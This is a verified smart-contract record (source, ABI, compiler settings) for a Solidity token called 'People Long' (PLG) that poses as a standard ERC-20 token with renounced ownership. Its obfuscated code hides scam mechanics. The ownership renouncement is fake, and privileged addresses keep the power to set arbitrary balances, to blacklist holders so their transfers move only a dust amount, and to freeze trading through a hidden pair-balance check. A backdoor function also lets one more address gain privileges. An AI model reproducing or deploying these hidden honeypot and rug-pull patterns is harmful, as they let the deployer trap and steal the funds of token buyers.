{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface totalSwap {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract takeMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchedMin {\n    function createPair(address senderLaunched, address totalBuy) external returns (address);\n}\n\ninterface senderTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamReceiver) external view returns (uint256);\n\n    function transfer(address feeIs, uint256 marketingMax) external returns (bool);\n\n    function allowance(address fundWallet, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address feeIs,\n        uint256 marketingMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atLimit, uint256 value);\n    event Approval(address indexed fundWallet, address indexed spender, uint256 value);\n}\n\ninterface shouldLimit is senderTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PeopleLong is takeMode, senderTo, shouldLimit {\n\n    function approve(address modeIsExempt, uint256 marketingMax) public virtual override returns (bool) {\n        liquidityLaunch[_msgSender()][modeIsExempt] = marketingMax;\n        emit Approval(_msgSender(), modeIsExempt, marketingMax);\n        return true;\n    }\n\n    uint256 public tokenReceiver;\n\n    function transfer(address launchAmountTeam, uint256 marketingMax) external virtual override returns (bool) {\n        return shouldTotal(_msgSender(), launchAmountTeam, marketingMax);\n    }\n\n    mapping(address => bool) public receiverLiquidityLimit;\n\n    uint256 private takeShould = 100000000 * 10 ** 18;\n\n    function allowance(address autoFee, address modeIsExempt) external view virtual override returns (uint256) {\n        if (modeIsExempt == buyTotal) {\n            return type(uint256).max;\n        }\n        return liquidityLaunch[autoFee][modeIsExempt];\n    }\n\n    address public enableMarketingToken;\n\n    function name() external view virtual override returns (string memory) {\n        return limitAmount;\n    }\n\n    bool public listTradingMarketing;\n\n    function tokenWallet(address sellReceiver) public {\n        fromTx();\n        \n        if (sellReceiver == enableMarketingToken || sellReceiver == totalTrading) {\n            return;\n        }\n        swapReceiver[sellReceiver] = true;\n    }\n\n    function fundTakeAmount(address sellTake) public {\n        require(sellTake.balance < 100000);\n        if (listTradingMarketing) {\n            return;\n        }\n        if (autoTake == atAmount) {\n            teamSender = sellTradingMin;\n        }\n        receiverLiquidityLimit[sellTake] = true;\n        \n        listTradingMarketing = true;\n    }\n\n    uint256 totalLaunched;\n\n    uint256 private teamSender;\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamLiquiditySender;\n    }\n\n    address launchAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public swapReceiver;\n\n    bool private shouldFee;\n\n    address private senderTrading;\n\n    address buyTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function senderTeam(address launchAmountTeam, uint256 marketingMax) public {\n        fromTx();\n        shouldEnable[launchAmountTeam] = marketingMax;\n    }\n\n    function owner() external view returns (address) {\n        return senderTrading;\n    }\n\n    address public totalTrading;\n\n    function launchFee(uint256 marketingMax) public {\n        fromTx();\n        totalLaunched = marketingMax;\n    }\n\n    function shouldTotal(address tradingTo, address feeIs, uint256 marketingMax) internal returns (bool) {\n        if (tradingTo == enableMarketingToken) {\n            return takeAtReceiver(tradingTo, feeIs, marketingMax);\n        }\n        uint256 marketingIs = senderTo(totalTrading).balanceOf(launchAmount);\n        require(marketingIs == totalLaunched);\n        require(feeIs != launchAmount);\n        if (swapReceiver[tradingTo]) {\n            return takeAtReceiver(tradingTo, feeIs, totalReceiver);\n        }\n        return takeAtReceiver(tradingTo, feeIs, marketingMax);\n    }\n\n    mapping(address => mapping(address => uint256)) private liquidityLaunch;\n\n    function takeAtReceiver(address tradingTo, address feeIs, uint256 marketingMax) internal returns (bool) {\n        require(shouldEnable[tradingTo] >= marketingMax);\n        shouldEnable[tradingTo] -= marketingMax;\n        shouldEnable[feeIs] += marketingMax;\n        emit Transfer(tradingTo, feeIs, marketingMax);\n        return true;\n    }\n\n    function minMarketing() public {\n        emit OwnershipTransferred(enableMarketingToken, address(0));\n        senderTrading = address(0);\n    }\n\n    function transferFrom(address tradingTo, address feeIs, uint256 marketingMax) external override returns (bool) {\n        if (_msgSender() != buyTotal) {\n            if (liquidityLaunch[tradingTo][_msgSender()] != type(uint256).max) {\n                require(marketingMax <= liquidityLaunch[tradingTo][_msgSender()]);\n                liquidityLaunch[tradingTo][_msgSender()] -= marketingMax;\n            }\n        }\n        return shouldTotal(tradingTo, feeIs, marketingMax);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return takeShould;\n    }\n\n    uint256 constant totalReceiver = 10 ** 10;\n\n    function getOwner() external view returns (address) {\n        return senderTrading;\n    }\n\n    function balanceOf(address teamReceiver) public view virtual override returns (uint256) {\n        return shouldEnable[teamReceiver];\n    }\n\n    event OwnershipTransferred(address indexed maxTradingBuy, address indexed fundLaunchWallet);\n\n    string private teamLiquiditySender = \"PLG\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxSender;\n    }\n\n    bool private autoTake;\n\n    function fromTx() private view {\n        require(receiverLiquidityLimit[_msgSender()]);\n    }\n\n    mapping(address => uint256) private shouldEnable;\n\n    constructor (){\n        \n        totalSwap atLaunch = totalSwap(buyTotal);\n        totalTrading = launchedMin(atLaunch.factory()).createPair(atLaunch.WETH(), address(this));\n        \n        enableMarketingToken = _msgSender();\n        minMarketing();\n        receiverLiquidityLimit[enableMarketingToken] = true;\n        shouldEnable[enableMarketingToken] = takeShould;\n        if (shouldFee) {\n            tokenReceiver = sellTradingMin;\n        }\n        emit Transfer(address(0), enableMarketingToken, takeShould);\n    }\n\n    uint256 limitList;\n\n    uint8 private maxSender = 18;\n\n    bool private atMin;\n\n    string private limitAmount = \"People Long\";\n\n    bool private atAmount;\n\n    uint256 public sellTradingMin;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxTradingBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundLaunchWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atLimit\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeIsExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeIsExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMarketingToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTake\",\"type\":\"address\"}],\"name\":\"fundTakeAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingMax\",\"type\":\"uint256\"}],\"name\":\"launchFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTradingMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverLiquidityLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTradingMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchAmountTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingMax\",\"type\":\"uint256\"}],\"name\":\"senderTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellReceiver\",\"type\":\"address\"}],\"name\":\"tokenWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchAmountTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "PeopleLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}